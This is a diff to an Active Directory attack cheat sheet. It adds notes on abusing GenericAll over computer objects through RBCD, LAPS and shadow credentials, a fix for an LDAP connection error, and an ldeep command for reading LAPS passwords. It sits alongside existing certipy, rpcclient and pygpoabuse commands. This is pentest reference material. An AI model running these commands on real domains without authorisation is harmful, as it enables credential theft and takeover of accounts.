@@ -111,6 +111,10 @@ rpcclient $> setuserinfo2 targetUser 23 newPassUser
 
 ### GenericAll on Computer
 
+1. You can abuse RBCD (need to add a new computer)
+2. You can abuse LAPS
+3. and Credential Shadow Attack
+
 ```bash
 certipy shadow auto -u username@domain.com -p 'password' -account 'computer$'
 ```
@@ -137,9 +141,12 @@ pygpoabuse 'domain'/'user':'password' -gpo-id "12345677-ABCD-9876-ABCD-123456789
 
 ## Read LAPS Password
 
+> If you get this error: `Error connecting to the domain, are you sure LDAP service is running on the target?` add dc to /etc/hosts
+
 ```bash
 pyLAPS.py --action get -d 'DOMAIN' -u 'USER' -p 'PASSWORD' --dc-ip dcIP
 crackmapexec ldap dcIP -d domain.com -u user -p password -M laps
+ldeep ldap -s ldap://dc01.domain.com -u 'testuser' -p 'pass' -d test.com laps
 ```
 
 ## Read GMSA Password
